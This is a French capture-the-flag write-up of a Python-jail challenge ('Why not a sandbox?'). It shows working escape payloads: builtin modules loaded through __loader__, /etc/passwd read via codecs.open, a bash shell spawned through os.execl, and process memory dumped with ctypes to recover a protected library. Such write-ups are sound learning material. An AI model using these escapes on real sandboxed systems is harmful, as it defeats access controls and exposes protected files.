### Why not a sandbox? (pwn, 500)

#### Description du challenge

```
Votre but est d'appeler la fonction print_flag pour afficher le flag.

Service : nc challenges1.france-cybersecurity-challenge.fr 4005
```

#### Solution

On se connecte au service et on est accueilli avec ce qui a tout l'air d'être un shell Python :

```python
$ nc challenges1.france-cybersecurity-challenge.fr 4005
Arriverez-vous à appeler la fonction print_flag ?
Python 3.8.2 (default, Apr  1 2020, 15:52:55) 
[GCC 9.3.0] on linux
>>> print_flag
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
NameError: name 'print_flag' is not defined
```

A partir de ce moment, je me dis que c'est une Python jail classique et j'essaie un peu tous les payloads usuels. L'importation semble être autorisée, mais sur un nombre restreint de modules :

```python
>>> import binascii
Exception ignored in audit hook:
Exception: Action interdite
Exception: Module non autorisé
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
Exception: Action interdite
```

En farfouillant un peu toutefois à l'aide de `dir()`, on arrive à importer les modules builtins que l'on veut :

```python
>>> L = __loader__.load_module
>>> L('binascii')
<module 'binascii' (built-in)>
```

La fonction `open` existe, mais on dirait que d'un hook empêche de l'utiliser :

```python
>>> open('a')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
Exception: Action interdite
```

Cependant, toujours en tatonnant, on trouve une fonction `open` dans le module *codecs* qui fonctionne. Génial.

```python
>>> open = L('codecs').open
>>> open('/etc/passwd', 'r').read()
'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/bin/false\nctf-init:x:1000:1000::/home/ctf-init:\nctf:x:1001:1001::/home/ctf:\n'
```

On peut maintenant lire des fichiers arbitraires sur le serveur... on essaie quelques noms du style `server.py` ou `chall.py`, mais rien de probant. Essayons de lire `/proc/self/maps` :

```
55b298700000-55b298701000 r--p 00000000 09:03 14549288                   /app/spython
55b298701000-55b298702000 r-xp 00001000 09:03 14549288                   /app/spython
55b298702000-55b298703000 r--p 00002000 09:03 14549288                   /app/spython
55b298703000-55b298704000 r--p 00002000 09:03 14549288                   /app/spython
55b298704000-55b298705000 rw-p 00003000 09:03 14549288                   /app/spython
55b299a56000-55b299b3b000 rw-p 00000000 00:00 0                          [heap]
7f5b9551d000-7f5b9559d000 rw-p 00000000 00:00 0 
7f5b955dd000-7f5b9569d000 rw-p 00000000 00:00 0 
7f5b956b8000-7f5b9581d000 rw-p 00000000 00:00 0 
7f5b9581d000-7f5b95824000 r--s 00000000 09:03 14555684                   /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
7f5b95824000-7f5b95856000 r--p 00000000 09:03 14554819                   /usr/lib/locale/C.UTF-8/LC_CTYPE
7f5b95856000-7f5b95858000 rw-p 00000000 00:00 0 
7f5b95858000-7f5b95867000 r--p 00000000 09:03 14549531                   /lib/x86_64-linux-gnu/libm-2.30.so
7f5b95867000-7f5b95902000 r-xp 0000f000 09:03 14549531                   /lib/x86_64-linux-gnu/libm-2.30.so
7f5b95902000-7f5b9599b000 r--p 000aa000 09:03 14549531                   /lib/x86_64-linux-gnu/libm-2.30.so
7f5b9599b000-7f5b9599c000 r--p 00142000 09:03 14549531                   /lib/x86_64-linux-gnu/libm-2.30.so
7f5b9599c000-7f5b9599d000 rw-p 00143000 09:03 14549531                   /lib/x86_64-linux-gnu/libm-2.30.so
7f5b9599d000-7f5b9599e000 r--p 00000000 09:03 14550555                   /lib/x86_64-linux-gnu/libutil-2.30.so
7f5b9599e000-7f5b9599f000 r-xp 00001000 09:03 14550555                   /lib/x86_64-linux-gnu/libutil-2.30.so
7f5b9599f000-7f5b959a0000 r--p 00002000 09:03 14550555                   /lib/x86_64-linux-gnu/libutil-2.30.so
7f5b959a0000-7f5b959a1000 r--p 00002000 09:03 14550555                   /lib/x86_64-linux-gnu/libutil-2.30.so
7f5b959a1000-7f5b959a2000 rw-p 00003000 09:03 14550555                   /lib/x86_64-linux-gnu/libutil-2.30.so
7f5b959a2000-7f5b959a3000 r--p 00000000 09:03 14549446                   /lib/x86_64-linux-gnu/libdl-2.30.so
7f5b959a3000-7f5b959a4000 r-xp 00001000 09:03 14549446                   /lib/x86_64-linux-gnu/libdl-2.30.so
7f5b959a4000-7f5b959a5000 r--p 00002000 09:03 14549446                   /lib/x86_64-linux-gnu/libdl-2.30.so
7f5b959a5000-7f5b959a6000 r--p 00002000 09:03 14549446                   /lib/x86_64-linux-gnu/libdl-2.30.so
7f5b959a6000-7f5b959a7000 rw-p 00003000 09:03 14549446                   /lib/x86_64-linux-gnu/libdl-2.30.so
7f5b959a7000-7f5b959a9000 rw-p 00000000 00:00 0 
7f5b959a9000-7f5b959b0000 r--p 00000000 09:03 14550538                   /lib/x86_64-linux-gnu/libpthread-2.30.so
7f5b959b0000-7f5b959bf000 r-xp 00007000 09:03 14550538                   /lib/x86_64-linux-gnu/libpthread-2.30.so
7f5b959bf000-7f5b959c4000 r--p 00016000 09:03 14550538                   /lib/x86_64-linux-gnu/libpthread-2.30.so
7f5b959c4000-7f5b959c5000 r--p 0001a000 09:03 14550538                   /lib/x86_64-linux-gnu/libpthread-2.30.so
7f5b959c5000-7f5b959c6000 rw-p 0001b000 09:03 14550538                   /lib/x86_64-linux-gnu/libpthread-2.30.so
7f5b959c6000-7f5b959ca000 rw-p 00000000 00:00 0 
7f5b959ca000-7f5b959e3000 r-xp 00000000 09:03 6689755                    /lib/x86_64-linux-gnu/libz.so.1.2.8
7f5b959e3000-7f5b95be2000 ---p 00019000 09:03 6689755                    /lib/x86_64-linux-gnu/libz.so.1.2.8
7f5b95be2000-7f5b95be3000 r--p 00018000 09:03 6689755                    /lib/x86_64-linux-gnu/libz.so.1.2.8
7f5b95be3000-7f5b95be4000 rw-p 00019000 09:03 6689755                    /lib/x86_64-linux-gnu/libz.so.1.2.8
7f5b95be4000-7f5b95be8000 r--p 00000000 09:03 14549470                   /lib/x86_64-linux-gnu/libexpat.so.1.6.11
7f5b95be8000-7f5b95c03000 r-xp 00004000 09:03 14549470                   /lib/x86_64-linux-gnu/libexpat.so.1.6.11
7f5b95c03000-7f5b95c0d000 r--p 0001f000 09:03 14549470                   /lib/x86_64-linux-gnu/libexpat.so.1.6.11
7f5b95c0d000-7f5b95c0e000 ---p 00029000 09:03 14549470                   /lib/x86_64-linux-gnu/libexpat.so.1.6.11
7f5b95c0e000-7f5b95c10000 r--p 00029000 09:03 14549470                   /lib/x86_64-linux-gnu/libexpat.so.1.6.11
7f5b95c10000-7f5b95c11000 rw-p 0002b000 09:03 14549470                   /lib/x86_64-linux-gnu/libexpat.so.1.6.11
7f5b95c11000-7f5b95c36000 r--p 00000000 09:03 14549378                   /lib/x86_64-linux-gnu/libc-2.30.so
7f5b95c36000-7f5b95d80000 r-xp 00025000 09:03 14549378                   /lib/x86_64-linux-gnu/libc-2.30.so
7f5b95d80000-7f5b95dca000 r--p 0016f000 09:03 14549378                   /lib/x86_64-linux-gnu/libc-2.30.so
7f5b95dca000-7f5b95dcd000 r--p 001b8000 09:03 14549378                   /lib/x86_64-linux-gnu/libc-2.30.so
7f5b95dcd000-7f5b95dd0000 rw-p 001bb000 09:03 14549378                   /lib/x86_64-linux-gnu/libc-2.30.so
7f5b95dd0000-7f5b95dd4000 rw-p 00000000 00:00 0 
7f5b95dd4000-7f5b95dd5000 r--p 00000000 09:03 14549270                   /app/lib_flag.so
7f5b95dd5000-7f5b95dd6000 r-xp 00001000 09:03 14549270                   /app/lib_flag.so
7f5b95dd6000-7f5b95dd7000 r--p 00002000 09:03 14549270                   /app/lib_flag.so
7f5b95dd7000-7f5b95dd8000 r--p 00002000 09:03 14549270                   /app/lib_flag.so
7f5b95dd8000-7f5b95dd9000 rw-p 00003000 09:03 14549270                   /app/lib_flag.so
7f5b95dd9000-7f5b95e4a000 r--p 00000000 09:03 14555712                   /usr/lib/x86_64-linux-gnu/libpython3.8.so.1.0
7f5b95e4a000-7f5b9609e000 r-xp 00071000 09:03 14555712                   /usr/lib/x86_64-linux-gnu/libpython3.8.so.1.0
7f5b9609e000-7f5b962b7000 r--p 002c5000 09:03 14555712                   /usr/lib/x86_64-linux-gnu/libpython3.8.so.1.0
7f5b962b7000-7f5b962bd000 r--p 004dd000 09:03 14555712                   /usr/lib/x86_64-linux-gnu/libpython3.8.so.1.0
7f5b962bd000-7f5b96304000 rw-p 004e3000 09:03 14555712                   /usr/lib/x86_64-linux-gnu/libpython3.8.so.1.0
7f5b96304000-7f5b96329000 rw-p 00000000 00:00 0 
7f5b9632b000-7f5b9632c000 r--p 00000000 09:03 14549310                   /lib/x86_64-linux-gnu/ld-2.30.so
7f5b9632c000-7f5b9634a000 r-xp 00001000 09:03 14549310                   /lib/x86_64-linux-gnu/ld-2.30.so
7f5b9634a000-7f5b96352000 r--p 0001f000 09:03 14549310                   /lib/x86_64-linux-gnu/ld-2.30.so
7f5b96353000-7f5b96354000 r--p 00027000 09:03 14549310                   /lib/x86_64-linux-gnu/ld-2.30.so
7f5b96354000-7f5b96355000 rw-p 00028000 09:03 14549310                   /lib/x86_64-linux-gnu/ld-2.30.so
7f5b96355000-7f5b96356000 rw-p 00000000 00:00 0 
7ffe9728e000-7ffe972af000 rw-p 00000000 00:00 0                          [stack]
7ffe9735c000-7ffe9735f000 r--p 00000000 00:00 0                          [vvar]
7ffe9735f000-7ffe97361000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]

```

Fantastique : il semblerait que le serveur soit en fait lancé par un binaire nommé `/app/spython`, et on remarque aussi l'existence d'un fichier très intéressant nommé `/app/lib_flag.so`. Probablement la fonction `print_flag` tant recherchée se trouve à l'intérieur !

On dump le binaire `spython`, par exemple en l'encodant en hexadécimal et en le rapatriant sur sa machine à l'aide d'un habile copier-coller :

```python
tohex = L('binascii').hexlify
tohex(open('spython', 'rb').read())
```

On l'analyse avec Ghidra. Le binaire utilise l'API CPython et semble utiliser une mécanique de *hooks* pour bloquer certaines opérations, mais je ne connais pas le fonctionnement plus en détail et je n'ai pas réussi à comprendre exactement tout le fonctionnement du binaire. Heureusement ce n'est pas très important pour réussir l'épreuve.

![](https://i.imgur.com/OAK8Q9V.png)

On remarque la fonction `welcome` qui affiche le message du début : ce symbole n'existe pas dans le binaire, il provient certainement de la fameuse `lib_flag.so`.

Essayons d'ailleurs de lire ce fichier :

```python
>>> open('lib_flag.so', 'rb')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python3.8/codecs.py", line 905, in open
    file = builtins.open(filename, mode, buffering)
PermissionError: [Errno 13] Permission denied: 'lib_flag.so'
```

Mince... A ce moment-là je me suis dit que j'allais continuer à traiter l'épreuve comme une jail classique, et j'ai trouvé le moyen d'importer `os` et d'obtenir un shell. Spoiler alert, ce shell ne sert à rien pour la résolution.

```python
>>> sys = L('sys')
>>> os = sys.meta_path[2].find_module('os').load_module('os')
>>> shell = lambda: os.execl('/bin/bash','/bin/bash')
>>> shell()
bash: cannot set terminal process group (15810): Inappropriate ioctl for device
bash: no job control in this shell
ctf@whynotasandbox:/app$ ls -la
total 40
drwxr-xr-x 1 root     root  4096 Apr 25 20:58 .
drwxr-xr-x 1 root     root  4096 Apr 25 20:59 ..
-r-------- 1 ctf-init ctf  16064 Apr 25 20:58 lib_flag.so
-r-sr-x--- 1 ctf-init ctf  14904 Apr 25 20:58 spython
```

Voici donc la source de tous nos problèmes : seul *ctf-init* peut lire `lib_flag.so`.

Cette deuxième partie de l'épreuve fut la plus difficile. Il faudrait soit trouver un moyen d'appeler `print_flag` depuis le shell Python, soit trouver un moyen de lire directement le contenu de `lib_flag.so`.

Après beaucoup d'essais infructueux, la solution m'est finalement apparue en m'inspirant de la toute fin de ce writeup : https://germano.dev/fuckpyjails/

Avec le module `ctypes`, on peut aller fouiller la mémoire du processus. En plus, on a le mapping mémoire grâce à `/proc/self/maps`, et en particulier les adresses des pages de là où est chargée `libc_flag.so` : c'est gagné.

```
7f5b95dd4000-7f5b95dd5000 r--p 00000000 09:03 14549270  /app/lib_flag.so
7f5b95dd5000-7f5b95dd6000 r-xp 00001000 09:03 14549270  /app/lib_flag.so
7f5b95dd6000-7f5b95dd7000 r--p 00002000 09:03 14549270  /app/lib_flag.so
7f5b95dd7000-7f5b95dd8000 r--p 00002000 09:03 14549270  /app/lib_flag.so
7f5b95dd8000-7f5b95dd9000 rw-p 00003000 09:03 14549270  /app/lib_flag.so
```

Voici un exemple de lecture en mémoire :

```python
>>> from ctypes import *
>>> OP = POINTER(c_char)
>>> s = "salut"
>>> s.__repr__ # address leak
<method-wrapper '__repr__' of str object at 0x7ffa315740f0>
>>> cast(0x7ffa315740f0, OP).contents
c_char(b'\x01')
```

Bon, le "salut" apparaît en réalité quelques dizaines d'octets plus tard, parce que la structure des objets *string* est plus complexe que ça (voir https://rushter.com/blog/python-strings-and-memory/).

Écrivons maintenant une fonction très utile qui nous permettra de dump la mémoire sur un nombre d'octets donné :

```python
mem = lambda addr, sz: b''.join(cast(addr+i, POINTER(c_char)).contents for i in range(sz))
```

Je passe les détails du dump des pages associées à `lib_flag.so`, toutes les adresses sont données, j'encode en hexa le total et je rapatrie sur ma machine.

On obtient un ELF mais il semble corrompu. En l'examinant, j'ai l'impression qu'une page (4096 octets) a été dupliquée pour une raison que je ne connais pas. En l'enlevant, ça fonctionne, et on fait chauffer Ghidra :

![](https://i.imgur.com/bZuBWza.png)


Un petit coup de CyberChef et c'est plié.

![](https://i.imgur.com/BoZ76yd.png)

Une épreuve très fun qui m'aura appris un tas de choses, fait lire beaucoup de doc, et qui avec du recul n'est pas si tirée par les cheveux. J'adore !
